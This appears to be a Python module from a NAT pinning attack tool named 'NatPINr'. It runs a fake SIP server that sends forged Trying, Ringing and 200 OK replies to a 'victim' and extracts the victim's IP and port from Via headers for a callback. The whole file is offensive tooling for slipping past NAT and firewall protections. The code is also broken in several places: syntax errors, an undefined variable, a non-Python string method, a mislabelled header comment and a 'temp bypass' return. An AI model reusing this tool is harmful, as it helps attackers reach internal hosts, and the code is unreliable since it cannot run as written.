#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import random
import struct
import select
import time

class SIPProtoHandler(asyncore.dispatcher_with_send):
	SIP_RINGING =""
	def __init__(self,conn_sock, client_address, server):
		global SIP_RINGING
		SIP_RINGING="""SIP/2.0 100 Trying
$via$
From: "NatPINr" ;tag=eihgg
To: 
Call-ID: hfxsabthoymshub@backtrack
CSeq: 650 INVITE 
User-Agent: Asterisk PBX
Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY 
Supported: replaces
Contact: 
Content-Length: 0

SIP/2.0 180 Ringing
$via$
From: "NatPINr" ;tag=eihgg
To: 
Call-ID: hfxsabthoymshub@backtrack
CSeq: 6500 INVITE
Contact: <sip:grmwl@192.168.2.126:5060;transport=TCP>
User-Agent: Linphone/3.5.2 (eXosip2/3.6.0)
Content-Length: 0

"""
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort))
	def handle_read(self):
		global SIP_RINGING
		data = self.recv(1024)
		if data !="":
			via = ""
			lines = data.split("\n")
			if "REGISTER" in lines[0]: handle_REGISTER(lines)
			elif "INVITE" in lines[0]: self.server.log("RECEIVED INVITE")
			return #temp bypass below code
			for line in lines:
				if "Via:" in line:
					via = line.strip()
					#Via: SIP/2.0/TCP 192.168.2.126:5060;branch=z9hG4bKbc9531bb-0dbb-e211-9afc-60672051a506;rport
					via_data = line.split(" ")
					proto = via_data[1].split("/")[2]
					callback = via_data[2].split(";")[0]
					numip = callback.split(":")[0]
					numport= callback.split(":")[1]
			if via != "":
				resp_ring = SIP_RINGING
				resp_ring = resp_ring.replace("$via$",via)
				self.send(resp_ring)
				self.server.log("SIP Invite for " + numip + ", port " + str(numport) + "("+proto +")")
				self.server.callback("SIP", self.server.CB_TYPE,numip,int(numport))
	#end def
	def handle_REGISTER(self, data)#UDP ONLY???
		via = ""
		seq = ""
		remhost = ""
		remport = ""
		callid=""
		contact=""
		response="""SIP/2.0 200 OK
CSeq: $seq$
Via: SIP/2.0/TCP $ip$:$port$;branch=z9hG4bK8ec10d9c-552b-e311-9e23-d4bed969aff2;rport
From: <sip:natpin@exploit>;tag=6c11ef9b-552b-e311-9e23-d4bed969aff2
Call-ID: 8c05ef9b-552b-e311-9e23-d4bed969aff2@ai1
To: <sip:natpin@victim>
Contact: <sip:natpin@$ip$:$port$>;q=1;expires=12000
Server:  NATPIN
Content-Length: 0

"""
		for line in lines:
			if "Via:" in line:
				via = line.strip()
				via_data = line.split(" ")
				callback = via_data[2].split(";")[0]
				remhost = callback.split(":")[0]
				remport= callback.split(":")[1]
			if "CSeq:" in line:
				seq = line.toUpper().replace("CSEQ: ","")
			if "Call-ID:" in line:
				callid = line.toUpper().replace("CALL-ID: ","")
		if via!= "" and seq !="" and callid != "":
			self.server.log("SIP REGISTER callback (UDP) received for " + remhost + " on port " + remport
			retpack = response
			retpack = retpack.replace("$seq$",seq)
			retpack = retpack.replace("$ip$",remhost)
			retpack = retpack.replace("$port$",remport)
			retpack = retpack.replace("$seq$",seq)
			self.send(retpack)
		else:
			self.server.log("Received invalid REGISTER request")
#end class

class Server(Base):
	def __init__(self,serverPort=843,sCallbackType="socket", verbose=False):
		self.TYPE = "SIP Server"
		self.EXIT_ON_CB = 1
		self.CB_TYPE=sCallbackType
		Base.__init__(self,"TCP",serverPort,sCallbackType,verbose)
		self.log("Started")
	#end def
	def protocolhandler(self,conn, addr):
		self.HANDLER = SIPProtoHandler(conn,addr,self)
	#end def
#end class
